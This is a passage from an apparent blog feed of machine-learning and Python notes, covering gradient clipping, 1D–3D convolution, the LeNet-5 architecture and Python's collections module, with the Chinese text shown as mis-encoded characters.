class="line">nn.utils.clip_grad_value_(model.parameters(), clip_value=1.0)</span><br><span class="line"></span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><h2 id="weight-constraint">weight constraint</h2><p>æ›´åŠ ç›´æ¥åœ°,è¿˜å¯ä»¥çº¦æŸæƒé‡çš„å¤§å°.</p><p>torch.clamp å¯å®ç° tensor ä¸€å®šèŒƒå›´çº¦æŸ</p><h2 id="ealy-stopping-ç¼“è§£è¿‡æ‹Ÿåˆ">ealy stopping ç¼“è§£è¿‡æ‹Ÿåˆ</h2><p>earlystoppingï¼Œæ¯ä¸ªç¥ç»å…ƒæ¿€æ´»å‡½æ•°åœ¨ä¸åŒæ•°å€¼åŒºé—´çš„æ€§èƒ½æ˜¯ä¸åŒçš„ï¼Œå€¼è¾ƒå°æ—¶ä¸ºçº¿æ€§åŒºï¼Œé€‚å½“å¢å¤§åä¸ºéçº¿æ€§åŒºï¼Œè¿‡åº¦å¢å¤§åˆ™ä¸ºé¥±åˆåŒºï¼ˆæ¢¯åº¦æ¶ˆå¤±ï¼‰ã€‚åˆå§‹åŒ–æ—¶ï¼Œç¥ç»å…ƒä¸€èˆ¬å·¥ä½œåœ¨çº¿æ€§åŒºï¼ˆæ‹Ÿåˆèƒ½åŠ›æœ‰é™ï¼‰ï¼Œè®­ç»ƒæ—¶é—´å¢å¤§æ—¶ï¼Œéƒ¨åˆ†å€¼ä¼šå¢å¤§è¿›å…¥éçº¿æ€§åŒºï¼ˆæ‹Ÿåˆèƒ½åŠ›æé«˜ï¼‰ï¼Œä½†æ˜¯è®­ç»ƒæ—¶é—´è¿‡å¤§æ—¶ï¼Œå°±ä¼šè¿›å…¥é¥±åˆåŒºï¼Œç¥ç»å…ƒå°±â€œæ­»æ‰â€ã€‚æ‰€ä»¥åº”è¯¥åœ¨é€‚å½“æ—¶é—´å†…å°±stopping è®­ç»ƒã€‚</p><h2 id="æ¨èæ–‡ç« ">æ¨èæ–‡ç« </h2><p><ahref="https://machinelearningmastery.com/introduction-to-weight-constraints-to-reduce-generalization-error-in-deep-learning/">AGentle Introduction to Weight Constraints in Deep Learning</a></p><p><a href="https://cs231n.github.io/neural-networks-2/#reg">CS231nConvolutional Neural Networks for Visual Recognition</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1D-3D å·ç§¯ç®€ä»‹</title>
      <link href="/blog/2022/07/15/ml/cnn/1d_3d_convolution/"/>
      <url>/blog/2022/07/15/ml/cnn/1d_3d_convolution/</url>
      
        <content type="html"><![CDATA[<h2 id="d-å·ç§¯">1D å·ç§¯</h2><p>ä¸€ç»´å·ç§¯ä¸»è¦ç”¨äºå¯¹åªæœ‰ä¸€ä¸ªç»´åº¦çš„æ—¶é—´åºåˆ—æå–ç‰¹å¾ï¼Œæ¯”å¦‚ä¿¡å·ã€è‚¡ä»·ã€å¤©æ°”ã€æ–‡æœ¬ä»¥åŠè‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658826960765.jpg"alt="16658826960765" /><figcaption aria-hidden="true">16658826960765</figcaption></figure><p>å¦‚ä¸Šå›¾ï¼Œå›¾ä¸­çš„è¾“å…¥çš„æ•°æ®ç»´åº¦ä¸º 8ï¼Œè¿‡æ»¤å™¨çš„ç»´åº¦ä¸º 5, æ­¥é•¿ stride ä¸º 1,åˆ™å·ç§¯åè¾“å‡ºçš„æ•°æ®ç»´åº¦ä¸º 8âˆ’5+1=4ã€‚</p><h2 id="d-å·ç§¯-1">2D å·ç§¯</h2><p>2Då·ç§¯æ˜¯æå–çš„å•å¼ é™æ€å›¾åƒçš„ç©ºé—´ç‰¹å¾ï¼Œç„¶ååŒç¥ç»ç½‘ç»œç»“åˆä¹‹åå®Œæˆå›¾åƒçš„åˆ†ç±»ã€æ£€æµ‹ç­‰è®¡ç®—æœºè§†è§‰æ–¹é¢çš„ä»»åŠ¡ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/2d_20221016.gif"alt="2d_20221016" /><figcaption aria-hidden="true">2d_20221016</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658827558899.jpg"alt="16658827558899" /><figcaption aria-hidden="true">16658827558899</figcaption></figure><p>å¦‚ä¸Šå›¾ä¸­çš„è¾“å…¥çš„æ•°æ®ç»´åº¦ä¸ºï¼ˆ14Ã—14ï¼‰ï¼Œè¿‡æ»¤å™¨å¤§å°ä¸º 5Ã—5ï¼Œæ­¥é•¿ stride ä¸º1, äºŒè€…åšå·ç§¯ï¼Œè¾“å‡ºçš„æ•°æ®ç»´åº¦ä¸ºï¼ˆ10Ã—10ï¼‰å³ï¼ˆ14âˆ’5+1=10ï¼‰ã€‚</p><h2 id="d-å·ç§¯-2">3D å·ç§¯</h2><p>2D å·ç§¯çš„ CNNå¯ä»¥è¾ƒå¥½åœ°å¤„ç†å•å¼ å›¾ç‰‡ï¼Œä½†æ˜¯å¯¹è§†é¢‘ï¼Œå³å¤šå¸§å›¾åƒå°±ä¼šæŸæ‰‹æ— ç­–ï¼Œå› ä¸º 2Då·ç§¯æ²¡æœ‰è€ƒè™‘åˆ°å›¾åƒä¹‹é—´çš„æ—¶é—´ç»´åº¦ä¸Šçš„ç‰©ä½“è¿åŠ¨ä¿¡æ¯ï¼Œå³å…‰æµåœºã€‚å› æ­¤ï¼Œä¸ºäº†èƒ½å¤Ÿå¯¹è§†é¢‘è¿›è¡Œç‰¹å¾ï¼Œä»¥ä¾¿ç”¨æ¥åˆ†ç±»ç­‰ä»»åŠ¡ï¼Œæå‡ºäº†3D å·ç§¯ï¼Œåœ¨å·ç§¯æ ¸ä¸­åŠ å…¥æ—¶é—´ç»´åº¦ã€‚ä¸‹å›¾å°±å¾ˆå¥½çš„è¯´æ˜äº† 2D å·ç§¯å’Œ 3Då·ç§¯ä¹‹é—´çš„å·®å¼‚ã€‚å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥ç›´è§‚çš„å‘ç° 3D CNNæå–çš„æ˜¯ä¸‰ç»´åº¦çš„æ–¹ä½“ç‰¹å¾ã€‚</p><p>3 ç»´å·ç§¯ï¼Œä¸€ä¸ª 3<em>3</em>3 çš„å·ç§¯æ ¸åœ¨ç«‹æ–¹ä½“ä¸Šè¿›è¡Œå·ç§¯ï¼Œå¾—åˆ°è¾“å‡ºã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/3d_cnn.gif"alt="3d_cnn" /></p><p>å¦‚ä¸‹å›¾ï¼Œå‡è®¾è¾“å…¥æ•°æ®çš„å¤§å°ä¸ºï¼ˆa1Ã—a2Ã—a3ï¼‰ï¼Œè¿‡æ»¤å™¨å¤§å°ä¸º fffï¼Œä¸‰ç»´å·ç§¯æœ€ç»ˆçš„è¾“å‡ºä¸º(a1âˆ’f+1)Ã—(a2âˆ’f+1)Ã—(a3âˆ’f+1)ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658852477248.jpg"alt="16658852477248" /><figcaption aria-hidden="true">16658852477248</figcaption></figure><p>è¡¥å……ï¼š3D å·ç§¯é‡Œé¢ä¹Ÿåˆ†ä¸ºå•é€šé“å’Œå¤šé€šé“ã€‚ é’ˆå¯¹å•é€šé“ï¼Œä¸ 2Då·ç§¯ä¸åŒä¹‹å¤„åœ¨äºï¼Œè¾“å…¥çš„å›¾åƒå¤šäº†ä¸€ä¸ª depth ç»´åº¦ï¼Œå³è¾“å…¥ä¸º(1, depth,height, width)ï¼Œå·ç§¯æ ¸ä¹Ÿå¤šäº†ä¸€ä¸ª k_d ç»´åº¦ï¼Œå› æ­¤å·ç§¯æ ¸åœ¨è¾“å…¥ 3Då›¾åƒçš„ç©ºé—´ç»´åº¦ï¼ˆheight å’Œ width ç»´ï¼‰å’Œ depthç»´åº¦ä¸Šå‡è¿›è¡Œæ»‘çª—æ“ä½œï¼Œæ¯æ¬¡æ»‘çª—ä¸ (k_d, k_h, k_w) çª—å£å†…çš„ valuesè¿›è¡Œç›¸å…³æ“ä½œï¼Œå¾—åˆ°è¾“å‡º 3D å›¾åƒä¸­çš„ä¸€ä¸ª valueã€‚ é’ˆå¯¹å¤šé€šé“ï¼Œè¾“å…¥å¤§å°ä¸º(3,depth, height, width)ï¼Œåˆ™ä¸ 2D å·ç§¯çš„æ“ä½œä¸€æ ·ï¼Œæ¯æ¬¡æ»‘çª—ä¸ 3 ä¸ª channelsä¸Šçš„ (k_d, k_h, k_w) çª—å£å†…çš„æ‰€æœ‰ values è¿›è¡Œç›¸å…³æ“ä½œï¼Œå¾—åˆ°è¾“å‡º 3Då›¾åƒä¸­çš„ä¸€ä¸ª valueã€‚</p><h2 id="å¤šé€šé“å·ç§¯ä¸-3d-å·ç§¯">å¤šé€šé“å·ç§¯ä¸ 3D å·ç§¯</h2><p>å¤šé€šé“å·ç§¯ä¸åŒçš„é€šé“ä¸Šçš„å·ç§¯æ ¸çš„å‚æ•°æ˜¯ä¸åŒçš„ï¼Œè€Œ 3Då·ç§¯åˆ™ç”±äºå·ç§¯æ ¸æœ¬èº«æ˜¯ 3Dçš„ï¼Œæ‰€ä»¥è¿™ä¸ªç”±äºâ€œæ·±åº¦â€é€ æˆçš„çœ‹ä¼¼ä¸åŒé€šé“ä¸Šç”¨çš„å°±æ˜¯åŒä¸€ä¸ªå·ç§¯ï¼Œæƒé‡å…±äº«å˜›ã€‚</p><p>æ€»ä¹‹ï¼Œå¤šäº†ä¸€ä¸ªæ·±åº¦é€šé“ï¼Œè¿™ä¸ªæ·±åº¦å¯èƒ½æ˜¯è§†é¢‘ä¸Šçš„è¿ç»­å¸§ï¼Œä¹Ÿå¯èƒ½æ˜¯ç«‹ä½“å›¾åƒä¸­çš„ä¸åŒåˆ‡ç‰‡ã€‚</p><p>3D å·ç§¯çš„åº”ç”¨</p><p>3Då·ç§¯å°±æ˜¯å¤šäº†ä¸€ä¸ªæ·±åº¦é€šé“ï¼Œè€Œè¿™ä¸ªæ·±åº¦é€šé“å¯èƒ½æ˜¯è§†é¢‘ä¸Šçš„è¿ç»­å¸§ï¼Œä¹Ÿå¯èƒ½æ˜¯ç«‹ä½“å›¾åƒä¸­çš„ä¸åŒåˆ‡ç‰‡ï¼Œæ‰€ä»¥ä»åº”ç”¨ä¸Šæ¥è¯´ï¼Œä¸»è¦å°±æ˜¯ä¸¤å¤§ä¸»è¦æ–¹å‘:è§†é¢‘åˆ†ç±»ä¸å›¾åƒåˆ‡å‰²</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://www.cnblogs.com/szxspark/p/8445406.html">å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰ä¹‹ä¸€ç»´å·ç§¯ã€äºŒç»´å·ç§¯ã€ä¸‰ç»´å·ç§¯è¯¦è§£- szx_spark - åšå®¢å›­</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä» LeNet5 å­¦ CNN</title>
      <link href="/blog/2022/07/15/ml/cnn/learn_cnn_lenet/"/>
      <url>/blog/2022/07/15/ml/cnn/learn_cnn_lenet/</url>
      
        <content type="html"><![CDATA[<p>LeNet-5 comprises seven layers, not counting the input, all of whichcontain trainable parameters (weights). The input is a 32x32 pixelgrayscale image.</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16696231411578.jpg"alt="16696231411578" /> The naming convention used by the authors:</p><ul><li>Cx â€” convolution layer,</li><li>Sx â€” subsampling (pooling) layer,</li><li>Fx â€” fully-connected layer,</li><li>x â€” index of the layer.</li></ul><p>The formula for calculating the output size of the convolutionallayer.</p><p><span class="math display">\[(Wâˆ’F+2P)/S+1\]</span></p><p>, where W is the input height/width (normally the images are squares,so there is no need to differentiate the two), F is the filter/kernelsize, P is the padding, and S is the stride.</p><p>Description of the LeNet-5 architecture layer by layer.</p><ol type="1"><li><p><strong>Layer 1 (C1)</strong>: convolutional layer</p><p><strong>Input</strong>: 1x32x32 pixel (in_channel=1 means that thegrayscle image only have one channel)</p><p><strong>Process</strong>: 6 kernels/filters/feature maps of size 5x5and the stride is 1 If in_channel=3. means that the image have 3channels, like RGB image. The kernel will extract 3 channels, that is,for each channel, there are 6 kernels of size 5x5, which is 6x3 tensorsof 5x5</p><p><strong>Ouput</strong>: 1x28x28x6 According to the formula:<code>(32-5+2*0)/1+1=28</code>, and each kernel will extracts achannel.</p></li><li><p><strong>Layer 2 (S2)</strong>: subsampling/pooling layer</p><p>The subsampling layer in the original architecture was a bit more<strong>complex than the traditionally used max/average poolinglayers</strong>. I will quote [1]: â€œ The four inputs to a unit in S2 areadded, then multiplied by a trainable coefficient, and added to atrainable bias. The result is passed through a sigmoidal function.â€. Asa result of non-overlapping receptive fields, the input to this layer ishalved in size (14Ã—14Ã—6).ã€‘</p><p>Input: 28x28x6 Proccess: avg or max pooling layer, the stride is 2Outputï¼š 14x14x6</p></li><li><p><strong>Layer 3 (C3)</strong>: The second convolutional layerwith the same configuration as the first one, however, this time with 16filters. The output of this layer is 10Ã—10Ã—16.</p></li><li><p><strong>Layer 4 (S4)</strong>: The second pooling layer. Thelogic is identical to the previous one, but this time the layer has 16filters. The output of this layer is of size 5Ã—5Ã—16.</p><p>Ouput: 5Ã—5Ã—16 æ± åŒ–å±‚æ˜¯å½“å‰å·ç§¯ç¥ç»ç½‘ç»œä¸­å¸¸ç”¨ç»„ä»¶ä¹‹ä¸€ï¼Œå®ƒæœ€æ—©è§äºLeNet ä¸€æ–‡ï¼Œç§°ä¹‹ä¸º Subsampleã€‚è‡ª AlexNet ä¹‹åé‡‡ç”¨ Poolingå‘½åã€‚æ± åŒ–å±‚æ˜¯æ¨¡ä»¿äººçš„è§†è§‰ç³»ç»Ÿå¯¹æ•°æ®è¿›è¡Œé™ç»´ï¼Œç”¨æ›´é«˜å±‚æ¬¡çš„ç‰¹å¾è¡¨ç¤ºå›¾åƒã€‚</p><p>å®æ–½æ± åŒ–çš„ç›®çš„ï¼š(1) é™ä½ä¿¡æ¯å†—ä½™ï¼›(2)æå‡æ¨¡å‹çš„å°ºåº¦ä¸å˜æ€§ã€æ—‹è½¬ä¸å˜æ€§ï¼›(3) é˜²æ­¢è¿‡æ‹Ÿåˆã€‚æ± åŒ–å±‚çš„å¸¸è§æ“ä½œåŒ…å«ä»¥ä¸‹å‡ ç§ï¼šæœ€å¤§å€¼æ± åŒ–ï¼Œå‡å€¼æ± åŒ–ï¼Œéšæœºæ± åŒ–ï¼Œä¸­å€¼æ± åŒ–ï¼Œç»„åˆæ± åŒ–ç­‰ã€‚</p><p>æ± åŒ–çš„è¶…çº§å‚æ•°åŒ…æ‹¬è¿‡æ»¤å™¨å¤§å°å’Œæ­¥å¹…ï¼Œå¸¸ç”¨çš„å‚æ•°å€¼ä¸ºï¼Œï¼Œåº”ç”¨é¢‘ç‡éå¸¸é«˜ï¼Œå…¶æ•ˆæœç›¸å½“äºé«˜åº¦å’Œå®½åº¦ç¼©å‡ä¸€åŠã€‚æœ€å¤§æ± åŒ–æ—¶ï¼Œå¾€å¾€å¾ˆå°‘ç”¨åˆ°è¶…å‚æ•°paddingï¼Œæœ€å¸¸ç”¨çš„å€¼æ˜¯ 0</p><p>æœ€å¤§æ± åŒ–åªæ˜¯è®¡ç®—ç¥ç»ç½‘ç»œæŸä¸€å±‚çš„é™æ€å±æ€§ï¼Œæ± åŒ–è¿‡ç¨‹ä¸­æ²¡æœ‰éœ€è¦å­¦ä¹ çš„å‚æ•°ã€‚æ‰§è¡Œåå‘ä¼ æ’­æ—¶ï¼Œåå‘ä¼ æ’­æ²¡æœ‰å‚æ•°é€‚ç”¨äºæœ€å¤§æ± åŒ–ã€‚</p></li><li><p><strong>Layer 5 (C5)</strong>: The last convolutional layer with120 5Ã—5 kernels. Given that the input to this layer is of size 5Ã—5Ã—16and the kernels are of size 5Ã—5, the output is 1Ã—1Ã—120. <strong>As aresult, layers S4 and C5 are fully-connected.</strong> That is also whyin some implementations of LeNet-5 actually use a fully-connected layerinstead of the convolutional one as the 5th layer. The reason forkeeping this layer as a convolutional one is the fact that if the inputto the network is larger than the one used in [1] (the initial input,32Ã—32 in this case), this layer will not be a fully-connected one, asthe output of each kernel will not be 1Ã—1.</p><p>Input: 5x5x16 Proccess: 120 kernels of size 5x5 Output: 1x1x120</p><p>åœ¨è¿™é‡Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ C5 å±‚ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„å·ç§¯å±‚ï¼Œå®ƒçš„è¾“å…¥æ˜¯ 16é€šé“ <code>5*5</code> å¤§å°çš„ç‰¹å¾å›¾åƒï¼Œè€Œè¾“å‡ºæ˜¯ä¸€ä¸ª 120 çš„å‘é‡ã€‚C5å±‚å¯ä»¥æœ‰ä¸¤ç§å®ç°ï¼Œç¬¬ä¸€ç§æ˜¯ä½¿ç”¨ <code>5*5</code>å¤§å°çš„å·ç§¯æ ¸è¿›è¡Œå·ç§¯ï¼Œç¬¬äºŒç§æ˜¯å°† 16 é€šé“ <code>5*5</code>å¤§å°çš„ç‰¹å¾å›¾åƒæ‹‰å¹³ï¼Œç„¶åå†åšå…¨è¿æ¥ã€‚</p></li><li><p><strong>Layer 6 (F6)</strong>: The first fully-connected layer,which takes the input of 120 units and returns 84 units. In the originalpaper, the authors used a custom activation function â€” a variant of thetanh activation function. For a thorough explanation, please refer toAppendix A in [1].</p><p>é‚£ä¹ˆå…¨è¿æ¥å±‚å¯¹æ¨¡å‹å½±å“å‚æ•°å°±æ˜¯ä¸‰ä¸ªï¼š</p><pre><code>å…¨æ¥è§£å±‚çš„æ€»å±‚æ•°ï¼ˆé•¿åº¦ï¼‰å•ä¸ªå…¨è¿æ¥å±‚çš„ç¥ç»å…ƒæ•°ï¼ˆå®½åº¦ï¼‰æ¿€æ´»å‡½æ•°é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½æ¿€æ´»å‡½æ•°çš„ä½œç”¨æ˜¯ï¼šå¢åŠ æ¨¡å‹çš„éçº¿æ€§è¡¨è¾¾èƒ½åŠ›</code></pre></li><li><p><strong>Layer 7 (F7)</strong>: The last dense layer, whichoutputs 10 units. In [1], the authors used Euclidean Radial BasisFunction neurons as activation functions for this layer.</p></li></ol><h2id="why-is-the-input-size-of-lenet-5-set-to-32x32-when-it-was-initially-trained-with-mnist-using-28x28-images">Whyis the input size of LeNet-5 set to <code>32x32</code> when it wasinitially trained with MNIST using <code>28x28</code> images?</h2><blockquote><p>The input is a 32x32 pixel image. This is significantly larger thanthe largest character in the database (at most <code>20x20</code> pixelscentered in a <code>28x28</code> field). The reason is that it isdesirable that potential distinctive features such as stroke endpointsor corner can appear in the center of the recep tive field of thehighest-level feature detectors</p><p>from original paper[2]</p></blockquote><h2 id="code">code</h2><p>ç”±äº MNIST æ•°æ®é›†å›¾ç‰‡å°ºå¯¸æ˜¯ 28x28 å•é€šé“çš„ï¼Œè€Œ LeNet-5 ç½‘ç»œè¾“å…¥ Inputå›¾ç‰‡å°ºå¯¸æ˜¯ 32x32ï¼Œå› æ­¤ä½¿ç”¨ transforms.Resize å°†è¾“å…¥å›¾ç‰‡å°ºå¯¸è°ƒæ•´ä¸º32x32ã€‚</p><p>LeNet-5 trained with MNIST dataset (PyTorch)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://towardsdatascience.com/implementing-yann-lecuns-lenet-5-in-pytorch-5e05a0911320">ImplementingYann LeCunâ€™s LeNet-5 in PyTorch | by Eryk Lewinson | Towards DataScience</a></li><li><a href="https://ieeexplore.ieee.org/document/726791">Gradient-basedlearning applied to document recognition | IEEE Journals &amp; Magazine| IEEE Xplore</a></li><li><ahref="http://vision.stanford.edu/cs598_spring07/papers/Lecun98.pdf">Gradient-basedlearning applied to document recognition pdf</a></li><li><ahref="https://github.com/erykml/medium_articles/blob/master/Computer%20Vision/lenet5_pytorch.ipynb">medium_articles/lenet5_pytorch.ipynbat master Â· erykml/medium_articles</a></li><li><ahref="https://baozoulin.gitbook.io/neural-networks-and-deep-learning/di-si-men-ke-juan-ji-shen-jing-wang-luo-convolutional-neural-networks/convolutional-neural-networks/foundations-of-convolutional-neural-networks/19-chi-hua-ceng-ff08-pooling-layers">1.9æ± åŒ–å±‚ï¼ˆPooling layersï¼‰ - DeepLearning.ai æ·±åº¦å­¦ä¹ è¯¾ç¨‹ç¬”è®°</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go through Python collections</title>
      <link href="/blog/2022/07/12/programming/python/1.basic/15.collections/"/>
      <url>/blog/2022/07/12/programming/python/1.basic/15.collections/</url>
      
        <content type="html"><![CDATA[<p>è¿‡ä¸€éå¯èƒ½æœ‰ç”¨çš„ä»£ç å’Œå‡½æ•°ï¼Œè¿™æ ·åœ¨éœ€è¦ç±»ä¼¼åŠŸèƒ½çš„æ—¶å€™å°±èƒ½å¤Ÿæƒ³èµ·æ¥å¹¶æŸ¥è¯¢ä½¿ç”¨ã€‚å¦‚æœæ¯æ¬¡åªæ˜¯çœ‹åˆ°äº†å°±æŸ¥ä¸€ä¸‹ï¼Œè‡ªå·±ä¸ä¼šå¤ªåœ¨æ„ï¼Œä¹Ÿä¸ä¼šç•™ä¸‹æ·±åˆ»çš„å°è±¡ï¼Œé‚£ä¹ˆåªæ˜¯è®¤è¯†äº†è¿™äº›ä»£ç å’Œå‡½æ•°ï¼Œè€Œä¸ä¼šçœŸæ­£åœ°ä¸ºè‡ªå·±æ‰€ç”¨ã€‚</p><p>Python çš„ collections æ¨¡å—æä¾› specialized container datatypesæ¥å¢å¼ºé€šç”¨ç›®çš„çš„å†…ç½®å®¹å™¨ï¼šdict, list, set å’Œ tuple.</p><table><colgroup><col style="width: 17%" /><col style="width: 82%" /></colgroup><thead><tr class="header"><th>Datatype</th><th>Descriptions</th></tr></thead><tbody><tr class="odd"><td><code>namedtuple()</code></td><td>factory function for creating tuple subclasses with namedfields</td></tr><tr class="even"><td><code>deque</code></td><td>list-like container with fast appends and pops on either end</td></tr><tr class="odd"><td><code>ChainMap</code></td><td>dict-like class for creating a single view of multiple mappings</td></tr><tr class="even"><td><code>Counter</code></td><td>dict subclass for countingÂ hashableÂ objects</td></tr><tr class="odd"><td><code>OrderedDict</code></td><td>dict subclass that remembers the order entries were added</td></tr><tr class="even"><td><code>defaultdict</code></td><td>dict subclass that calls a factory function to supply missingvalues</td></tr><tr class="odd"><td><code>UserDict</code></td><td>wrapper around dictionary objects for easier dict subclassing</td></tr><tr class="even"><td><code>UserList</code></td><td>wrapper around list objects for easier list subclassing</td></tr><tr class="odd"><td><code>UserString</code></td><td>wrapper around string objects for easier string subclassing</td></tr></tbody></table><blockquote><p>reference: <ahref="https://docs.python.org/3/library/collections.html">collections â€”Container datatypes â€” Python 3.11.4 documentation</a></p></blockquote><h2 id="improving-code-readability-namedtuple">Improving CodeReadability: namedtuple()</h2><p><code>nametuple()</code> æ˜¯ tuple subclasses with named fields,å¯ä»¥é€šè¿‡ dot notationçš„æ–¹å¼ç›´æ¥è®¿é—®å…ƒç»„ä¸­çš„å€¼ï¼Œä¾‹å¦‚ï¼š<code>obj.arr</code>,ä»è€Œå¢å¼ºä»£ç çš„å¯è¯»å†™æ€§ã€‚åœ¨éœ€è¦ä½¿ç”¨çš„ tuple å…·æœ‰å¤šä¸ª itemså¹¶ä¸”æ„é€ ä½ç½®å’Œä½¿ç”¨ä½ç½®è·ç¦»æ¯”è¾ƒè¿œæ—¶ï¼Œå°† tuple æ¢ä½œ nametuple æœ€ä½³ã€‚</p><p><code>collections.namedtuple(typename, field_names, *, rename=False, defaults=None, module=None)</code>:</p><ul><li><p><code>typename</code> æ˜¯åˆ›å»ºçš„ nametupleçš„åå­—ï¼Œè¦æ±‚æ˜¯æœ‰æ•ˆå‘½åçš„å­—ç¬¦ä¸²</p></li><li><p><code>field_name</code> æ˜¯ the list of field namesï¼Œç”¨æ¥è®¿é—®tuple ä¸­å…ƒç´ </p><p>å¯æ˜¯ä»¥ä¸‹å‡ ç§ string ç›¸å…³å¯¹è±¡ï¼š</p><ul><li>å¯è¿­ä»£çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š<code>["field1", "field2", "field3]</code></li><li>a string with whitespace-separated field names, suchasï¼š<code>"field1 field2 field3"</code></li><li>a string with comma-separated field names, such as<code>field1, field2, field3</code></li><li>a generator expression as field names, such as<code>(field for field in "xy")</code></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [3]: from collections import *</span><br><span class="line"></span><br><span class="line">In [4]: def custom_divmod(x, y):</span><br><span class="line">   ...:     DivMod = namedtuple(&#x27;DivMod&#x27;, &#x27;quotient remainder&#x27;)</span><br><span class="line">   ...:     return DivMod(*divmod(x, y))</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [5]: result = custom_divmod(18, 4)</span><br><span class="line">   ...: result, result.quotient, result.remainder</span><br><span class="line">Out[5]: (DivMod(quotient=4, remainder=2), 4, 2)</span><br></pre></td></tr></table></figure><p>2D point</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [7]: Point = namedtuple(&quot;Point&quot;, [&#x27;x&#x27;, &#x27;y&#x27;]) # Use a list of strings as field names</span><br><span class="line"></span><br><span class="line">In [8]: point = Point(2,4)</span><br><span class="line"></span><br><span class="line">In [9]: point.x</span><br><span class="line">Out[9]: 2</span><br><span class="line"></span><br><span class="line">In [11]: Point = namedtuple(&#x27;point&#x27;, &#x27;x y&#x27;) # Use a string with whitespace-separated field names</span><br><span class="line"></span><br><span class="line">In [12]: point = Point(2,4)</span><br><span class="line"></span><br><span class="line">In [14]: point.y</span><br><span class="line">Out[14]: 4</span><br></pre></td></tr></table></figure><p>tuple æ˜¯ä¸å¯å˜å¯¹è±¡, namedtuple å¯ä»¥é€šè¿‡ <code>_replace</code>æ¥æ”¹å˜å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [15]: Person = namedtuple(&quot;Person&quot;, &quot;name job&quot;, defaults = [&#x27;python developer&#x27;])</span><br><span class="line"></span><br><span class="line">In [16]: person = Person(&quot;Jane&quot;); person</span><br><span class="line">Out[17]: Person(name=&#x27;Jane&#x27;, job=&#x27;python developer&#x27;)</span><br><span class="line"></span><br><span class="line">In [18]: # create dictionary from a named tuple</span><br><span class="line">In [20]: person = Person(&quot;Jane&quot;)</span><br><span class="line"></span><br><span class="line">In [21]: person._asdict()</span><br><span class="line">Out[21]: &#123;&#x27;name&#x27;: &#x27;Jane&#x27;, &#x27;job&#x27;: &#x27;python developer&#x27;&#125;</span><br><span class="line"></span><br><span class="line">In [22]: # replace the value of job</span><br><span class="line">In [23]: person = person._replace(job=&quot;web developer&quot;)</span><br><span class="line"></span><br><span class="line">In [24]: person</span><br><span class="line">Out[24]: Person(name=&#x27;Jane&#x27;, job=&#x27;web developer&#x27;)</span><br></pre></td></tr></table></figure><h2 id="counter"><code>Counter</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collections.Counter([iterable-or-mapping]) A Counter is a dict subclass for counting hashable objects.</span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„å‚æ•°éœ€è¦æ˜¯å¯è¿­ä»£å¯¹è±¡æˆ–è€…æ˜ å°„ï¼Œä¾‹å¦‚ï¼šå­—å…¸ï¼Œåˆ—è¡¨ï¼Œå…ƒç»„ç­‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [47]: Counter([1,3,3,5,1])</span><br><span class="line">Out[47]: Counter(&#123;1: 2, 3: 2, 5: 1&#125;)</span><br><span class="line"></span><br><span class="line">In [50]: Counter(&quot;hello&quot;)</span><br><span class="line">Out[50]: Counter(&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 1, &#x27;l&#x27;: 2, 